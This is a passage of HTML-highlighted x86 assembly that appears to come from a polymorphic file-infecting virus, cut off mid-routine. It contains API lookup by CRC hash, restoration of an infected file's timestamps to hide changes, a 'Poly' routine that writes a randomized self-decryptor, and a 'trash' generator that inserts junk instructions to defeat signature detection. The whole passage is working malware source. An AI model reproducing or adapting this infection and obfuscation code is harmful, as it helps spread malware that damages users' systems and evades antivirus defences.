</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MappingHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">RestoreAttributes</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SetFileTimeCRC</span><span class="sc4">,</span><span class="sc5">SFTNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseHandleCRC</span><span class="sc4">,</span><span class="sc5">CHNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Poly creates a decryptor rutine overwriting code since MyEntryPoint to Encrypted</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   none</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Poly</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetTickCountCRC</span><span class="sc4">,</span><span class="sc5">GTCNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MyEntryPoint</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0000003Fh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;random</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">noesp1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">noesp1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc1">;random</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">noesp2</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">noesp2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nosame</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nosame</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">nosame</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zpop</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc1">;random</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zadd</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc1">;random</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zmov</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc1">;random2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc1">;jnz must jump here</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zxor</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zdec</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">zor</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">850Fh</span><span class="sc0"> </span><span class="sc1">;jne rel32</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc1">; where jnz must jump</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">esireg</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ecxreg</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Trash generates unuseful instructions for decryptor</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;   edi -&gt; memory where function must write the trash code </span><span class="sc0">
</span><span class="sc1">;   ecx -&gt; bytes to write</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;   edi = initial edi + ecx</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">trash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoTrash</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">randomize</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">ok0</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;xor esireg,ecxreg ;33h -&gt; ins code  +  11xxxyyyb -&gt; registers</span><span class="sc0">
</span><span class="sc1">;more trash</span><span class="sc0">
</span><span class="sc1">;xor esireg,ecxreg ;undo changes</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash2</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">ok1</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;push esireg</span><span class="sc0">
</span><span class="sc1">;push ecxreg</span><span class="sc0">
</span><span class="sc1">;push xx</span><span class="sc0">
</span><span class="sc1">;more trash</span><span class="sc0">
</span><span class="sc1">;pop  xx</span><span class="sc0">
</span><span class="sc1">;pop  ecxreg</span><span class="sc0">
</span><span class="sc1">;pop  esireg</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esireg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ecxreg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">random2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash3</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash4</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc1">;stc</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash5</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc1">;clc</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash6</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc1">;cmc</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">Trash6</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Trash7</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
